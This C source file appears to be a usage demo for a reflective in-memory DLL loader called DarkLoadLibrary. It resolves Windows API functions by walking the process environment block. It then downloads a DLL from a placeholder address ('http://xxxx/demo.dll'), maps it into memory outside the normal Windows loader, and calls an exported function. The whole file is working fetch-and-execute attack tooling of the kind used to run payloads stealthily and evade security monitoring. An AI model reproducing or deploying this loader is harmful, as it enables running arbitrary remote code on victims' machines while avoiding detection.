#include <stdio.h>
#include <windows.h>

#include "pebutils.h"
#include "darkloadlibrary.h"

typedef VOID (* _ThisIsAFunction) (VOID);

VOID main()
{
	GETPROCESSHEAP pGetProcessHeap = (GETPROCESSHEAP)GetFunctionAddress(IsModulePresent(L"Kernel32.dll"), "GetProcessHeap");
	HEAPFREE pHeapFree = (HEAPFREE)GetFunctionAddress(IsModulePresent(L"Kernel32.dll"), "HeapFree");

	PDARKMODULE DarkModule = DarkLoadLibrary(
		LOAD_REMOTE_FILE,
		"http://xxxx/demo.dll",
		NULL,
		0,
		L"Demo"
	);

	if (!DarkModule->bSuccess)
	{
		printf("load failed: %S\n", DarkModule->ErrorMsg);
		pHeapFree(pGetProcessHeap(), 0, DarkModule->ErrorMsg);
		pHeapFree(pGetProcessHeap(), 0, DarkModule);
		return;
	}

	_ThisIsAFunction ThisIsAFunction = (_ThisIsAFunction)GetFunctionAddress(
		(HMODULE)DarkModule->ModuleBase,
		"Demo"
	);
	pHeapFree(pGetProcessHeap(), 0, DarkModule);

	if (!ThisIsAFunction)
	{
		printf("failed to find it\n");
		return;
	}

    ThisIsAFunction();

	return;
}